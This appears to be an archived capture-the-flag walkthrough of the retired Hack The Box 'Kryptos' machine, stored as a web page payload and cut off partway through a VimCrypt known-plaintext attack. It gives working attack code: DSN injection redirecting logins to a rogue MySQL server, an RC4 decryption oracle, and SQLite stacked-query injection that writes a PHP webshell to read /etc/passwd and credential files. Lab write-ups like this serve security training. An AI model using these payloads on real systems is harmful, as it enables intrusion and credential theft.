@@ -1,0 +1,625 @@
+1:"$Sreact.fragment"
+2:I[4236,[],""]
+3:I[170,[],""]
+5:I[6025,[],"OutletBoundary"]
+6:"$Sreact.suspense"
+9:I[6025,[],"ViewportBoundary"]
+b:I[6025,[],"MetadataBoundary"]
+d:I[4168,[],"default",1]
+:HL["/_next/static/css/d6e294cd2610ae11.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-kryptos-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-kryptos-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d6e294cd2610ae11.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"Person\",\"@id\":\"https://cyberkareem.com/#person\",\"name\":\"Abdullah Kareem\",\"alternateName\":\"CyberKareem\",\"url\":\"https://cyberkareem.com\",\"jobTitle\":\"Security Researcher and Penetration Tester\",\"knowsAbout\":[\"Vulnerability research\",\"Penetration testing\",\"Responsible disclosure\",\"Web application security\",\"API security\",\"Mobile application security\",\"Infrastructure security\",\"Active Directory security\",\"Wireless security\",\"Application security consulting\"],\"sameAs\":[\"https://www.linkedin.com/in/cyberkareem/\",\"https://github.com/CyberKareem\",\"https://x.com/cyberkareem\",\"https://linktr.ee/cyberkareem\",\"https://app.hackthebox.com/public/users/349278\",\"https://www.credential.net/profile/cyberkareem/wallet\",\"https://www.credly.com/users/cyberkareem/badges\"]},{\"@type\":\"WebSite\",\"@id\":\"https://cyberkareem.com/#website\",\"url\":\"https://cyberkareem.com\",\"name\":\"CyberKareem — Abdullah Kareem\",\"publisher\":{\"@id\":\"https://cyberkareem.com/#person\"}}]}"}}]]}]}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":["$L4",null,["$","$L5",null,{"children":["$","$6",null,{"name":"Next.MetadataOutlet","children":"$@7"}]}]]}],{},null,false,null]},null,false,"$@8"]},null,false,"$@8"]},null,false,null],["$","$1","h",{"children":[null,["$","$L9",null,{"children":"$La"}],["$","div",null,{"hidden":true,"children":["$","$Lb",null,{"children":["$","$6",null,{"name":"Next.Metadata","children":"$Lc"}]}]}],null]}],false]],"m":"$undefined","G":["$d",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"65jXSdzueZKnFbMeYrtpi"}
+e:[]
+8:"$We"
+f:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+10:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+:HL["/writing/covers/hackthebox-kryptos-walkthrough.webp","image"]
+4:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$Lf",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","a","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","a","/about",{"href":"/about","aria-current":"$undefined","children":"About"}]]}],["$","$Lf",null,{"className":"utility-link","href":"/contact#assessment-enquiries","aria-current":"$undefined","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L10",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$Lf",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Kryptos Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Kryptos machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:57:35.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[19," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-kryptos-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Kryptos machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Kryptos machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/kryptos","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/d39857078d63ac190b36c202340bd35a38ae8e99/HTB-Kryptos.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · d39857078d63",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Kryptos"," · Linux"," · Insane"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/kryptos","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L11"]}]]}],["$L12","$L13","$L14"]]}],"$L15"]}]]}],"$L16"]}],"$L17","$L18"]
+11:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+12:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Kryptos machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+13:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+14:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"22 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+19:T90be,
+<p><strong>Difficulty:</strong> Insane | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.2.163 | <strong>Attacker:</strong> 10.10.14.6</p>
+<hr />
+
+
+
+<h2 id="1-machine-overview-and-mindset">1. Machine Overview &amp; Mindset</h2>
+<p>Kryptos is an Insane-rated Linux box that lives up to its name — every single phase involves breaking or abusing a cryptographic or authentication primitive. It requires chaining <strong>five distinct vulnerabilities</strong> before reaching root, with each step gating the next.</p>
+<h3 id="the-insane-mindset">The Insane Mindset</h3>
+<p>On Insane boxes, nothing is handed to you. You must:</p>
+<ul>
+<li><strong>Read responses carefully</strong> — error codes are clues, not just noise</li>
+<li><strong>Think about trust boundaries</strong> — who decides what server to authenticate against?</li>
+<li><strong>Know your crypto primitives</strong> — stream cipher keystream reuse, VimCrypt blowfish bugs, broken PRNGs</li>
+<li><strong>Be patient with tooling</strong> — half the work is getting your tools to speak the right protocol</li>
+</ul>
+<h3 id="full-attack-chain-bird-s-eye-view">Full Attack Chain (Bird's Eye View)</h3>
+<pre><code>Login form  →  DSN injection  →  Rogue MySQL  →  Auth bypass
+    ↓
+encrypt.php  →  RC4 keystream reuse  →  Internal URL access (/dev)
+    ↓
+sqlite_test_page.php  →  SQLite stacked queries  →  ATTACH DATABASE  →  PHP webshell
+    ↓
+/home/rijndael/creds.txt  →  VimCrypt blowfish XOR  →  SSH credentials
+    ↓
+kryptos.py on port 81  →  PRNG brute  →  ECDSA key recovery  →  eval() jail escape  →  root
+</code></pre>
+<hr />
+<h2 id="2-reconnaissance">2. Reconnaissance</h2>
+<h3 id="why-recon-matters">Why Recon Matters</h3>
+<p>Before touching any vulnerability, you need to understand the attack surface. Recon tells you what ports are open, what services are running, and what technology stack you're dealing with. Every detail feeds your hypothesis generation.</p>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p- --min-rate 5000 10.129.2.163
+</code></pre>
+<p><strong>Output (relevant):</strong></p>
+<pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Cryptor Login
+</code></pre>
+<p><strong>What this tells us:</strong></p>
+<ul>
+<li>Only two ports — SSH and HTTP. The entire attack surface is the web application.</li>
+<li>Apache 2.4.29 on Ubuntu Bionic (18.04) — known OS fingerprint helps scope CVEs.</li>
+<li>Title is "Cryptor Login" — this box will involve cryptography.</li>
+<li>SSH is available — once we find credentials, we can get a proper shell.</li>
+</ul>
+<h3 id="web-directory-brute-force">Web Directory Brute Force</h3>
+<pre><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.2.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
+</code></pre>
+<p><strong>Key findings:</strong></p>
+<pre><code>/index.php     (200)
+/encrypt.php   (302 → redirects to login)
+/decrypt.php   (302 → redirects to login)
+/dev           (403 → Forbidden)
+/url.php       (200 → empty)
+/aes.php       (200 → empty)
+/rc4.php       (200 → empty)
+</code></pre>
+<p><strong>Hacker mindset:</strong></p>
+<ul>
+<li><code>encrypt.php</code> and <code>decrypt.php</code> redirect when unauthenticated → they exist but require a session.</li>
+<li><code>url.php</code>, <code>aes.php</code>, <code>rc4.php</code> return 200 but empty → these are <strong>include files</strong> called by encrypt/decrypt. The box is encryption-themed.</li>
+<li><code>/dev</code> returns 403 Forbidden — not 404. The directory <strong>exists</strong> but is access-controlled. This is a target for later.</li>
+<li>The encryption theme (<code>aes.php</code>, <code>rc4.php</code>) is a strong hint that crypto weaknesses are in scope.</li>
+</ul>
+<h3 id="login-page-analysis">Login Page Analysis</h3>
+<p>Intercepting the login POST request reveals:</p>
+<pre><code>POST / HTTP/1.1
+username=admin&amp;password=REDACTED
+</code></pre>
+<p><strong>Critical observation:</strong> The <code>db</code> parameter is user-controlled. In normal applications, the database name is hardcoded. Exposing it in the form suggests it is directly used in a database connection string — a potential injection point.</p>
+<p>Testing with a modified <code>db</code> value returns:</p>
+<pre><code>PDOException code: 1044
+</code></pre>
+<p>PDO = PHP Data Objects. Error 1044 = "Access denied for user to database". This confirms the <code>db</code> value is being fed into a <strong>PDO DSN string</strong> to connect to MySQL.</p>
+<hr />
+<h2 id="3-phase-1-auth-bypass-via-dsn-injection">3. Phase 1 — Auth Bypass via DSN Injection</h2>
+<h3 id="concept-what-is-a-pdo-dsn">Concept: What is a PDO DSN?</h3>
+<p>PHP connects to databases via a Data Source Name (DSN) string:</p>
+<pre><code class="language-php" data-language="php">$conn = new PDO("mysql:host=localhost;dbname=" . $_POST['db'], $user, $pass);
+</code></pre>
+<p>If <code>$_POST['db']</code> is not sanitized, an attacker can inject additional DSN parameters. The MySQL DSN format supports semicolon-separated key=value pairs:</p>
+<pre><code>mysql:host=localhost;dbname=cryptor;port=3306
+</code></pre>
+<p>By injecting <code>;host=10.10.14.6;</code>, we can redirect the database connection to our own machine.</p>
+<h3 id="why-this-is-powerful">Why This is Powerful</h3>
+<p>The application authenticates users by querying a MySQL database. If we control which MySQL server it queries, we can:</p>
+<ol>
+<li><strong>Capture</strong> the MySQL credentials it uses (the app's DB username/password)</li>
+<li><strong>Create a fake database</strong> that returns valid authentication for any credentials we choose</li>
+<li><strong>Log in</strong> as any user</li>
+</ol>
+<p>This is a supply-chain style attack — we don't break into the app, we impersonate its infrastructure.</p>
+<h3 id="step-1-confirm-outbound-connection">Step 1: Confirm Outbound Connection</h3>
+<p>Set up a listener on port 3306 (MySQL's default port):</p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 3306
+</code></pre>
+<p>Send a login POST with the injected <code>db</code>:</p>
+<pre><code>db=cryptor;host=10.10.14.6;port=3306
+</code></pre>
+<p>You receive a connection from the target. <strong>Confirmed: the server will connect to us.</strong></p>
+<h3 id="step-2-capture-the-mysql-credentials">Step 2: Capture the MySQL Credentials</h3>
+<p>Use Metasploit's MySQL capture module (or configure real MariaDB) to capture the challenge-response authentication hash:</p>
+<pre><code>[+] 10.129.2.163 - User: dbuser; Challenge: 112233...; Response: 73def07d...
+</code></pre>
+<p>Crack with John:</p>
+<pre><code class="language-bash" data-language="bash">john --wordlist=/usr/share/wordlists/rockyou.txt capture_hash
+# Result: krypt0n1te
+</code></pre>
+<p><strong>Why crack it?</strong> We need these credentials to allow the target to successfully authenticate to our rogue MySQL. Without them, the handshake would fail even with our fake server.</p>
+<h3 id="step-3-set-up-the-rogue-mysql">Step 3: Set Up the Rogue MySQL</h3>
+<p>Configure MariaDB on Kali to listen on all interfaces:</p>
+<pre><code class="language-bash" data-language="bash"># /etc/mysql/mariadb.conf.d/50-server.cnf
+bind-address = 0.0.0.0
+</code></pre>
+<pre><code class="language-bash" data-language="bash">sudo systemctl restart mariadb
+</code></pre>
+<p>Create the fake authentication database. The application queries:</p>
+<pre><code class="language-sql" data-language="sql">SELECT username, password FROM users WHERE username='x' AND password=REDACTED
+</code></pre>
+<p>Note: passwords are stored/compared as MD5 hashes.</p>
+<pre><code class="language-sql" data-language="sql">CREATE USER 'dbuser'@'%' IDENTIFIED BY 'krypt0n1te';
+CREATE DATABASE cryptor;
+GRANT ALL PRIVILEGES ON cryptor.* TO 'dbuser'@'%' IDENTIFIED BY 'krypt0n1te';
+USE cryptor;
+CREATE TABLE users (username varchar(255), password varchar(255));
+INSERT INTO users (username, password) VALUES ('admin', MD5('admin'));
+FLUSH PRIVILEGES;
+</code></pre>
+<h3 id="step-4-trigger-the-bypass">Step 4: Trigger the Bypass</h3>
+<p>Send the login request with the injection. Use Python to automate CSRF token handling:</p>
+<pre><code class="language-python" data-language="python">import requests
+from bs4 import BeautifulSoup
+
+TARGET = "http://10.129.2.163"
+KALI   = "10.10.14.6"
+
+s = requests.Session()
+r = s.get(TARGET)
+token = REDACTED, 'html.parser').find("input", {"name": "token"})["value"]
+
+data = {
+    "username": "admin",
+    "password": null,
+    "db": f"cryptor;host={KALI};port=3306",
+    "token": REDACTED,
+    "login": ""
+}
+r = s.post(TARGET, data=data)
+# Response: "File Encryptor" page = SUCCESS
+</code></pre>
+<p><strong>Hacker mindset:</strong> The CSRF token regenerates on every page load, so you can't replay requests in Burp without refreshing. Automating token fetch is the pragmatic solution for any repeatable testing.</p>
+<p><strong>Result:</strong> Logged in as <code>admin</code>. We now have an authenticated session on the web application.</p>
+<hr />
+<h2 id="4-phase-2-rc4-keystream-abuse-to-access-dev">4. Phase 2 — RC4 Keystream Abuse to Access /dev</h2>
+<h3 id="concept-rc4-and-keystream-reuse">Concept: RC4 and Keystream Reuse</h3>
+<p>RC4 is a stream cipher. Encryption works like this:</p>
+<pre><code>ciphertext = plaintext XOR keystream
+</code></pre>
+<p>The keystream is generated from a key. The critical property:</p>
+<ul>
+<li>If you <strong>encrypt the same key</strong> twice, the second encryption XORs the ciphertext with the same keystream, cancelling it:</li>
+</ul>
+<pre><code>encrypt(encrypt(plaintext)) = plaintext XOR keystream XOR keystream = plaintext
+</code></pre>
+<p>This is known as <strong>keystream reuse</strong> — a fundamental stream cipher misuse.</p>
+<h3 id="the-application-s-encrypt-feature">The Application's Encrypt Feature</h3>
+<p>After login, <code>encrypt.php</code> allows submitting a URL. The server:</p>
+<ol>
+<li>Fetches the URL's content</li>
+<li>RC4-encrypts it</li>
+<li>Returns the base64-encoded ciphertext</li>
+</ol>
+<p>Since the <strong>same key/keystream</strong> is used for every request, we can use the encrypt endpoint as a <strong>decryption oracle</strong>:</p>
+<ol>
+<li>Submit target URL → server fetches content, returns <code>base64(RC4(content))</code></li>
+<li>Decode base64 → get raw ciphertext bytes</li>
+<li>Serve those bytes from our own HTTP server</li>
+<li>Submit our server's URL → server fetches ciphertext bytes, RC4-encrypts them again → <code>base64(RC4(RC4(content)))</code> = <code>base64(content)</code></li>
+<li>Decode base64 → <strong>plaintext</strong></li>
+</ol>
+<h3 id="why-this-matters">Why This Matters</h3>
+<p>We can now make the <strong>target server fetch any internal URL</strong> (like <code>http://127.0.0.1/dev/...</code>) and decrypt the response — bypassing the 403 Forbidden restriction on <code>/dev</code> that blocks external access.</p>
+<h3 id="setting-up-the-relay">Setting Up the Relay</h3>
+<p>Start an HTTP server in your working directory:</p>
+<pre><code class="language-bash" data-language="bash">cd ~/Downloads/kryptos
+python3 -m http.server 8000
+</code></pre>
+<p>Discover the correct form parameters first:</p>
+<pre><code class="language-python" data-language="python"># The form uses GET (no method attr = default GET) to /encrypt.php
+# Parameters: url= and cipher= (values: "AES-CBC" or "RC4")
+r = s.get(f"{TARGET}/encrypt.php", params={"url": target_url, "cipher": "RC4"})
+</code></pre>
+<p>Full RC4 fetch function:</p>
+<pre><code class="language-python" data-language="python">def rc4_fetch(s, url):
+    # Step 1: get RC4(content) from server
+    r = s.get(f"{TARGET}/encrypt.php", params={"url": url, "cipher": "RC4"})
+    ct_b64 = BeautifulSoup(r.text, 'html.parser').find("textarea").text.strip()
+    ct_bytes = base64.b64decode(ct_b64)
+
+    # Step 2: save raw ciphertext for relay
+    with open("relay.bin", "wb") as f:
+        f.write(ct_bytes)
+
+    # Step 3: re-encrypt → XOR cancels → base64(plaintext)
+    r2 = s.get(f"{TARGET}/encrypt.php",
+               params={"url": f"http://{KALI}:8000/relay.bin", "cipher": "RC4"})
+    pt_b64 = BeautifulSoup(r2.text, 'html.parser').find("textarea").text.strip()
+    return base64.b64decode(pt_b64).decode(errors='replace')
+</code></pre>
+<h3 id="discovering-dev-contents">Discovering /dev Contents</h3>
+<p>Fetch the ToDo page:</p>
+<pre><code class="language-bash" data-language="bash">python3 rc4_fetch.py "http://127.0.0.1/dev/index.php?view=todo"
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-html" data-language="html">&lt;h3&gt;ToDo List:&lt;/h3&gt;
+1) Remove sqlite_test_page.php
+2) Remove world writable folder which was used for sqlite testing
+3) Do the needful
+&lt;h3&gt;Done:&lt;/h3&gt;
+4) Restrict access to /dev
+5) Disable dangerous PHP functions
+</code></pre>
+<p><strong>Critical intelligence gathered:</strong></p>
+<ul>
+<li><code>sqlite_test_page.php</code> still exists — developers forgot to remove it</li>
+<li>A <strong>world-writable folder</strong> still exists — we can write files to disk</li>
+<li>Dangerous PHP functions (system, exec, etc.) are disabled — but not all of them</li>
+<li><code>/dev</code> access is restricted from outside, but not from 127.0.0.1</li>
+</ul>
+<h3 id="reading-php-source-via-php-filter">Reading PHP Source via PHP Filter</h3>
+<p>PHP's <code>php://filter</code> wrapper can base64-encode files before they're output, allowing us to read PHP source code without it being executed:</p>
+<pre><code class="language-bash" data-language="bash">python3 rc4_fetch.py "http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page"
+</code></pre>
+<p>Decode the base64 blob from the HTML response:</p>
+<pre><code class="language-bash" data-language="bash"># Extract the base64 string and decode
+echo "&lt;BASE64_BLOB&gt;" | base64 -d
+</code></pre>
+<p><strong>Result:</strong> Full PHP source of <code>sqlite_test_page.php</code>.</p>
+<hr />
+<h2 id="5-phase-3-sqlite-injection-to-webshell">5. Phase 3 — SQLite Injection to Webshell</h2>
+<h3 id="analysing-the-source-code">Analysing the Source Code</h3>
+<pre><code class="language-php" data-language="php">$no_results = $_GET['no_results'];
+$bookid = $_GET['bookid'];
+$query = "SELECT * FROM books WHERE id=" . $bookid;  // NO sanitization!
+
+if (isset($bookid)) {
+    class MyDB extends SQLite3 {
+        function __construct() {
+            // This folder is world writable
+            $this-&gt;open('[redacted retired-lab hash or flag]/books.db');
+        }
+    }
+    $db = new MyDB();
+
+    if (isset($no_results)) {
+        $ret = $db-&gt;exec($query);    // exec() supports stacked queries
+    } else {
+        $ret = $db-&gt;query($query);   // query() does NOT
+    }
+}
+</code></pre>
+<p><strong>Key observations:</strong></p>
+<ol>
+<li><code>$bookid</code> is directly concatenated into the SQL query — classic SQLi</li>
+<li>When <code>no_results</code> is set, <code>exec()</code> is used — this supports <strong>multiple statements</strong> (stacked queries)</li>
+<li>The DB file is in <code>[redacted retired-lab hash or flag]/</code> which is <strong>world-writable</strong></li>
+<li>Full web path is <code>[redacted encoded lab material]</code></li>
+</ol>
+<h3 id="the-attach-database-technique">The ATTACH DATABASE Technique</h3>
+<p>SQLite has a feature called <code>ATTACH DATABASE</code> that opens (or creates) a second database file. Combined with stacked queries, we can:</p>
+<ol>
+<li><code>ATTACH DATABASE '/var/www/html/dev/.../shell.php' AS shell</code> — creates a new SQLite file at that path</li>
+<li><code>CREATE TABLE shell.pwn (dataz text)</code> — creates a table in that file</li>
+<li><code>INSERT INTO shell.pwn VALUES ('&lt;?php ... ?&gt;')</code> — inserts PHP code as a row</li>
+</ol>
+<p>The resulting file is a valid SQLite binary that <strong>also contains our PHP code</strong> as a string. When PHP parses it, it scans for <code>&lt;?php</code> tags and executes them, ignoring the binary SQLite header.</p>
+<h3 id="critical-gotcha-quote-escaping">Critical Gotcha: Quote Escaping</h3>
+<p>The SQL INSERT uses double quotes as string delimiters:</p>
+<pre><code class="language-sql" data-language="sql">insert into shell.pwn (dataz) values ("&lt;?php ... ?&gt;");
+</code></pre>
+<p>Any double quotes <strong>inside</strong> the PHP code will break the SQL string. Always use single quotes in the embedded PHP:</p>
+<pre><code class="language-python" data-language="python"># WRONG - double quotes inside break SQL
+php_code = '&lt;?php echo file_get_contents($_GET["f"]); ?&gt;'
+
+# CORRECT - single quotes only inside
+php_code = "&lt;?php echo 'KSTART:'; echo file_get_contents($_GET['f']); echo ':KEND'; ?&gt;"
+</code></pre>
+<h3 id="another-gotcha-disabled-functions">Another Gotcha: Disabled Functions</h3>
+<p>The ToDo mentioned "Disable dangerous PHP functions". This covers execution functions like <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>. However, <strong>file reading functions</strong> like <code>file_get_contents()</code> and <code>readfile()</code> are typically not disabled since they're used by legitimate applications.</p>
+<p>We use <code>file_get_contents()</code> for our webshell — sufficient to read credentials from disk.</p>
+<h3 id="writing-the-webshell">Writing the Webshell</h3>
+<pre><code class="language-python" data-language="python">from urllib.parse import quote
+
+shell_path = '[redacted encoded lab material].php'
+php_code   = "&lt;?php echo 'KSTART:'; echo file_get_contents($_GET['f']); echo ':KEND'; ?&gt;"
+
+sqli = (
+    f"1;attach database '{shell_path}' as sh;"
+    f"create table sh.pwn (dataz text);"
+    f"insert into sh.pwn (dataz) values (\"{php_code}\");--"
+)
+
+url = f"http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid={quote(sqli)}"
+rc4_fetch(s, url)
+</code></pre>
+<p><strong>Why the <code>KSTART:</code>/<code>:KEND</code> markers?</strong> The SQLite binary header (starting with <code>SQLite format 3</code>) appears before our <code>&lt;?php</code> tag. PHP outputs that binary data as-is. The markers let us reliably extract just our PHP output from the binary noise.</p>
+<h3 id="verifying-the-shell">Verifying the Shell</h3>
+<pre><code class="language-python" data-language="python">result = rc4_fetch(s, "http://127.0.0.1/dev/[redacted retired-lab hash or flag]/shell.php?f=/etc/passwd")
+start = result.find("KSTART:")
+end   = result.find(":KEND")
+print(result[start+7:end])
+# root:x:0:0:root:/root:/bin/bash ...
+</code></pre>
+<h3 id="reading-target-files">Reading Target Files</h3>
+<p><strong><code>/home/rijndael/creds.old</code></strong> (to confirm known plaintext):</p>
+<pre><code>rijndael / Password1
+</code></pre>
+<p><strong><code>/home/rijndael/creds.txt</code></strong> (VimCrypt binary — must base64-encode through PHP to survive text encoding):</p>
+<pre><code class="language-python" data-language="python"># Use a separate shell that base64-encodes output
+php_code = "&lt;?php echo 'KSTART:'; echo base64_encode(file_get_contents($_GET['f'])); echo ':KEND'; ?&gt;"
+</code></pre>
+<p>Then decode the result:</p>
+<pre><code class="language-python" data-language="python">b64  = result[start+7:end].strip()
+raw  = base64.b64decode(b64)
+# raw = 54 bytes of VimCrypt binary
+</code></pre>
+<hr />
+<h2 id="6-phase-4-vimcrypt-known-plaintext-attack">6. Phase 4 — VimCrypt Known-Plaintext Attack</h2>
+<h3 id="what-is-vimcrypt">What is VimCrypt?</h3>
+<p>Vim's built-in encryption saves files with a header identifying the cipher:</p>
+<ul>
+<li><code>VimCrypt~01!</code> = ZIP/XOR (very weak)</li>
+<li><code>VimCrypt~02!</code> = Blowfish CFB (weak due to implementation bug)</li>
+<li><code>VimCrypt~03!</code> = Blowfish2 CFB (more secure)</li>
+</ul>
+<p>Our file starts with <code>VimCrypt~02!</code> — Blowfish with a known vulnerability.</p>
+<h3 id="the-file-format">The File Format</h3>
+<pre><code>Offset  Length  Field
+0       12      Magic: "VimCrypt~02!"
+12       8      Salt (used to derive key from password)
+20       8      IV (initialization vector for CFB mode)
+28      26      Ciphertext (the actual encrypted content)
+</code></pre>
+<p>Total: 54 bytes. Ciphertext is 26 bytes.</p>
+<h3 id="the-blowfish-cfb-vulnerability">The Blowfish CFB Vulnerability</h3>
+<p>Vim's Blowfish CFB mode has a well-documented implementation bug: it operates as <strong>8-bit CFB</strong> (one byte at a time), but each byte of keystream is derived from a <strong>full 64-bit Blowfish block</strong>. Crucially, the same 8-byte block is used to generate <strong>8 consecutive keystream bytes</strong> without advancing the cipher state properly.</p>
+<p>The net effect: <strong>the keystream repeats every 8 bytes</strong>.</p>
+<pre><code>keystream = K0 K1 K2 K3 K4 K5 K6 K7 K0 K1 K2 K3 K4 K5 K6 K7 K0 ...
+</code></pre>
+<h3 id="the-known-plaintext-xor-attack">The Known-Plaintext XOR Attack</h3>
+<p>We have:</p>
+<ul>
+<li><strong>Known plaintext</strong> from <code>creds.old</code>: <code>rijndael / Password1\n</code> (21 bytes)</li>
+<li><strong>Ciphertext</strong> from <code>creds.txt</code>: 26 bytes (starting at offset 28)</li>
+</ul>
